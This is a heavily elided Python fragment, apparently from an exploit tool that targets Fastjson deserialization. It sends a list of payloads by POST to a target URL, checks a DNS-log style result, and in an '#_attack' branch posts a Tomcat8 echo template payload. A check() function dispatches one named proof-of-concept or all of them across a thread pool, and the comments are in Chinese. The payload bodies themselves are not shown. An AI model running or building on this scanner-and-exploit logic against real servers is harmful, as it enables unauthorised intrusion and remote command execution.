        ...
        try:
            ...
            if self.vuln == 'False':
                for payload in payload_list:
                    ...
                    r = exprequest.post(self.url, headers=Headers, data=payload)
                    sleep(0.5)
                    if DL.result():
            ...
            #_attack
                ...
                request = exprequest.post(self.url, headers=Headers, data=Tomcat8Template%TomcatEchoTemplateStatic)
...
def check(**kwargs):
    ...
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpFastjson, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(Fastjson):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpFastjson, func)))
    #保存全局子线程列表
